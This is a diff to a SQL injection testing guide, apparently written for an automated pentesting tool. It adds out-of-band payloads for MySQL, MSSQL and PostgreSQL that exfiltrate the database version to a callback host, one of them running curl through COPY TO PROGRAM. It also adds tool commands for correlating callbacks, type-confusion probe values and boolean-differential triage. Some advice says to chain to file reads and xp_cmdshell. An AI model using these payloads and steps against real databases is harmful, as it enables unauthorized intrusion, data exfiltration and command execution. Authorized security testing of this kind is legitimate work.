@@ -96,14 +96,53 @@ START
   |
   v
 [3d] Out-of-Band (when time-based is unreliable)
-  |-- Requires OOB callback infrastructure (interactsh/Burp Collaborator).
-  |-- MySQL:  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.COLLAB\\a'))--
-  |-- MSSQL:  '; EXEC master..xp_dirtree '\\COLLAB\a'--
-  |-- PG:     '; COPY (SELECT version()) TO PROGRAM 'curl http://COLLAB/'--
+  |-- Requires OOB callback infrastructure. Confirm with `aith oob status --json`.
+  |-- Mint a nonce-tagged host, embed it, then poll for the correlated hit
+  |     (replaces reading the listener log by hand). See "Out-of-Band Correlation" below.
+  |-- MySQL:  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.<NONCE_HOST>\\a'))--
+  |-- MSSQL:  '; EXEC master..xp_dirtree '\\<NONCE_HOST>\a'--
+  |-- PG:     '; COPY (SELECT version()) TO PROGRAM 'curl http://<NONCE_HOST>/'--
   |-- OOB is the most reliable blind detection method when available.
   |-- MySQL LOAD_FILE requires FILE privilege (disabled by default since 5.7.6
   |     with secure_file_priv). MSSQL xp_dirtree works on most default installs.
 ```
+
+### Out-of-Band Correlation
+
+Mint a unique callback host per injection point and let the correlator bind the hit to the probe — never eyeball the listener log:
+
+```bash
+aith oob mint --technique sqli --target-url "https://target/item?id=1" --param id --probe-kind dns --json
+# -> nonce  <prefix>-<token>
+#    dns    <prefix>-<token>.researcher.example   (use as <NONCE_HOST> above)
+```
+
+Substitute the minted host for `<NONCE_HOST>` in the payloads above (xp_dirtree is the single most reliable vector — not disabled by default, no sysadmin needed), deliver via the kali exec wrapper, then:
+
+```bash
+aith oob poll --client <name> --json
+```
+
+A non-empty `matched` array for your nonce is the confirmation: each match pairs the callback (`protocol`, `remote_address`) with the recorded probe (`technique`, `target_url`). For a `CONCAT(version(),...)`-style exfil payload the leaked DB version arrives as the left label of the matched callback host. Reproduce from a second independent payload shape before declaring, then chain to file read / `xp_cmdshell` where the DB supports it. Empty `matched` after the payload lands → fall back to boolean/time-based and record a runtime issue.
+
+---
+
+## Typing the Injected Value
+
+At decision-tree node `[2]`, before hand-rolling probes, classify the value the parameter currently carries and let the oracle generate type-aware variants. This is most productive for ID-bearing and JSON-body parameters — the `format` bucket directly exercises the type-confusion path this skill flags (ORMs that parameterize scalars but pass objects/arrays unsafely):
+
+```bash
+aith assess classify-payload "42" --mutations          # type: sequential_id
+aith assess classify-payload "2025-06-01" --mutations  # type: date
+```
+
+Consume by intent bucket:
+
+- **`format`** — for a `sequential_id`/`integer` value this yields `"42"` (int-as-string), `[42]` (int-as-array), `{"id": 42}` (int-as-object), `null`, `[]` (and, past the default 5-cap, `{}` and `42.0` — pass `--max-per-intent 7`). Drop these into a JSON body or nested param (`{"user_id": [42]}`) to test whether the query builder string-interpolates non-scalar inputs — the exact gap behind the "JSON API injection" and "Batch/bulk endpoints" patterns below.
+- **`boundary`** — `0`, `-1`, `1`, `99999999`, `2147483647` (raise the cap for `-2147483648` and `9999999999999`) probe integer-overflow and off-by-one handling; pair with the `?id=2-1` arithmetic test (arithmetic that resolves server-side confirms a numeric injection context).
+- **`empty`** — empty string, `null`, `undefined`, a single space, and a NUL byte exercise null-handling in the WHERE clause.
+
+These are deterministic seed variants for the injection-context probe — they do not replace the DBMS-specific UNION/error/blind payloads (which are query *fragments*, not typed parameter values; pull those from the payload reference once the database is fingerprinted).
 
 ---
 
@@ -127,6 +166,21 @@ Time-based is the technique most likely to give false results. Network jitter, l
 - If results are inconsistent, the delay may be from connection pooling (shared sleep across threads on MySQL < 5.7) or WAF throttling. Increase delay or switch methods.
 
 **BENCHMARK vs SLEEP (MySQL):** `BENCHMARK(10000000, SHA1('x'))` is an alternative to SLEEP that works even when SLEEP is disabled by the DBA. But execution time varies by server hardware — calibrate on the target first.
+
+---
+
+## Boolean Triage on Dynamic Content
+
+`[3b] Boolean-Based` lives or dies on the TRUE-vs-FALSE response *differential*. On pages with timestamps, CSRF tokens, rotating ads, or per-request nonces, raw length/word counts wobble enough to mask (or fake) the signal — the same noise that gives sqlmap boolean false positives. Rather than eyeballing two near-identical bodies, capture the response population and let the anomaly oracle find the genuine outlier.
+
+Collect one record per probe (the TRUE/FALSE pair, ideally interleaved with a few benign baselines) as JSONL, then rank:
+
+```bash
+# each line: {"url":"...AND 1=1","status":200,"content_length":5120,"words":410,"lines":88}
+aith assess anomaly-score boolean_probes.jsonl --top 5
+```
+
+Consume the ranking: the oracle buckets near-equal lengths/words so dynamic jitter clusters together, and **degrades the weight of near-unique columns** so a per-response CSRF token cannot dominate. If the `AND 1=1` and `AND 1=2` rows fall into *different* buckets while your benign baselines cluster, that structural split is your boolean differential — promote it and start `SUBSTRING(...)` extraction against the side that flips. If TRUE, FALSE, and baselines all score ~0 (same buckets), the parameter is not boolean-injectable on this signal — drop to `[3c]` time-based. This is also the triage step for an Intruder/sqlmap fuzz dump: feed the whole result set in and investigate the top-ranked outlier first.
 
 ---
 
